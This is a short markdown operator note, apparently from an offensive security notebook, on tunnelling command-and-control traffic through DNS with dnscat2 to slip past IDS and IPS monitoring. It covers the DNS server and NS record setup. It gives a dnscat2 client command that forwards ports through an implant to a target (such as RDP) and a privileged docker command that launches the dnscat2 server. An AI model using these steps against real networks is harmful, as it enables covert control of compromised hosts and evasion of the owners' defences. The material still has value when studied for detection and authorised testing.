---
title: DNS tunneling
tags:
  - breach
  - operations
  - dns
  - tunneling
  - bypass
  - ids
  - ips
---

Smuggling traffic through DNS is genuinely cool. The tunneling of malicious
traffic through DNS is tough tto track, and most networks don't have the
security features enable to prevent a sophisticated actor from smuggling their
C2 traffic via DNS.

Some prerequisites for DNS tunneling? We need a valid DNS server and an NS
record that points DNS requests to our C2 host. Once that's done, we can use
tools like [dnscat2](https://github.com/iagox86/dnscat2)to command and control
implants.

To establish a tunnel through a **dnscat2** implant and session, we can invoke
the following:

```bash
command (client) 1> listen ${LHOST}:${LPORT} ${RHOST}:${RPORT}
```

With this DNS tunnel established, we can do interesting things like establish an
RDP session with the target at `${RHOST}:${RPORT}` over DNS - and all of the
traffic is encrypted!

dnscat2 has some troubles running on baremetal hosts - I recommend using
[this docker image](https://hub.docker.com/r/arno0x0x/dnscat2/). Invoke the
container, enabling it to use your host's network stack, with the following:

```bash
sudo docker run --rm -ti --privileged --network host -e DOMAIN_NAME="${YOUR_DOMAIN}" --name dnscat2 arno0x0x/dnscat2
```
